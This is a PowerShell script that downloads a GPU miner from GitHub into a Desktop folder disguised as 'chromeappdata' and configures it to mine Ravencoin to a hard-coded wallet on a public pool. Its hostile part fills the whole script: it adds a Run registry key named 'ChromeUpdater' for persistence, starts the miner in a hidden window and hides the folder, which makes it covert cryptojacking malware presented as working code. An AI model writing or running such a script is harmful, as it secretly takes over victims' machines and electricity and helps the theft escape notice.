# Initialize
Start-Process powershell -Wait
Start-Sleep -Milliseconds 250

# Localize
Set-Location -Path "$HOME\Desktop"
Start-Sleep -Milliseconds 250
New-Item -Path "$HOME\Desktop\chromeappdata" -ItemType Directory -Force
Start-Sleep -Milliseconds 250
Set-Location -Path "$HOME\Desktop\chromeappdata"
Start-Sleep -Milliseconds 250

# Download and UnZip
Start-Process curl -ArgumentList "-s -L -o cmdMD23111891.zip https://github.com/develsoftware/GMinerRelease/releases/download/3.41/gminer_3_41_windows64.zip" -NoNewWindow -Wait
Start-Sleep -Seconds 3
Expand-Archive -Path ".\cmdMD23111891.zip" -DestinationPath ".\" -Force
Start-Sleep -Seconds 2
$filesToKeep = @('mine_ravencoin.bat', 'miner.exe', 'miner.exe.sig', 'public.gpg')  # Filenames to keep
Get-ChildItem -File | Where-Object { $_.Name -notin $filesToKeep } | Remove-Item -Force
Start-Sleep -Milliseconds 1200

$scriptPath = (Get-Item .\mine_ravencoin.bat).FullName
Set-Content -Path $scriptPath -Value "miner.exe --algo kawpow --server us-rvn.2miners.com:6060 --intensity 50 --user RY3GhiW9KVLYqhvqDGuXoi7EZ78oFMqRsU" -Force
Start-Sleep -Milliseconds 250

# Add to the "Run" registry key
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ChromeUpdater" -Value $scriptPath
Start-Sleep -Milliseconds 200

# Execute the bat file
Start-Process -FilePath ".\mine_ravencoin.bat" -WindowStyle Hidden
Start-Sleep -Milliseconds 200

# Encryption setup (commented as per original script)
#$encryptionKey = "YourEncryptionKey"
#$keySecureString = ConvertTo-SecureString $encryptionKey -AsPlainText -Force

# Move up to Desktop, Hide the folder
Set-Location -Path "$HOME\Desktop"
Set-ItemProperty -Path ".\chromeappdata" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
Start-Sleep -Milliseconds 250

# Exit
exit